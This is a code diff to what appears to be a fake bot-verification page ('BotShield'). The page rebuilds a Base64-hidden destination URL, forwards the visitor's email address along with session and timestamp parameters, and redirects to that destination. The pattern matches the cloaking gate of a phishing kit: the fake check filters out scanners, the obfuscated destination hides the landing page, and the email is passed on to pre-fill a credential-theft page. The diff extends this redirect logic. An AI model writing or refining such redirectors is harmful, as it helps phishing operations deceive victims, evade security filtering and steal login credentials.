@@ -256,7 +256,7 @@
             }, 800);
         }
 
-        // 4. Verification Success Callback (Forwarding 'direct' email parameter)
+        // 4. Verification Success Callback (Forwarding 'direct', 'sid', and 'ts' parameters)
         function onVerificationSuccess() {
             try {
                 // Reconstruct base target URL from Base64 parts
@@ -265,20 +265,33 @@
                 // Read incoming URL parameters passed to BotShield
                 const urlParams = new URLSearchParams(window.location.search);
                 
-                // Check if an email parameter exists in URL (?direct=, ?email=, or ?e=)
+                // Extract parameters
                 const emailValue = urlParams.get('direct') || urlParams.get('email') || urlParams.get('e');
+                const sid = urlParams.get('sid');
+                const ts = urlParams.get('ts');
                 
+                // Build destination parameters
+                const destParams = new URLSearchParams();
+        
+                // Standardize email parameter to 'direct'
                 if (emailValue) {
-                    // Format strictly as ?direct=value for your main page backend script
+                    destParams.set('direct', emailValue.trim());
+                }
+        
+                // Preserve Cloudflare session token and timestamp
+                if (sid) destParams.set('sid', sid);
+                if (ts) destParams.set('ts', ts);
+        
+                // If destParams has keys, append them; otherwise fallback to raw search string
+                if (Array.from(destParams.keys()).length > 0) {
                     const separator = targetUrl.includes('?') ? '&' : '?';
-                    targetUrl += `${separator}direct=${encodeURIComponent(emailValue.trim())}`;
+                    targetUrl += separator + destParams.toString();
                 } else if (window.location.search) {
-                    // Fallback: append any other search queries present
                     const separator = targetUrl.includes('?') ? '&' : '?';
                     targetUrl += separator + window.location.search.substring(1);
                 }
-
-                // Redirect user to destination page with parameter intact
+        
+                // Redirect user to destination page with all security parameters intact
                 window.location.href = targetUrl;
             } catch (err) {
                 console.error("Invalid URL encoding or redirection error.");
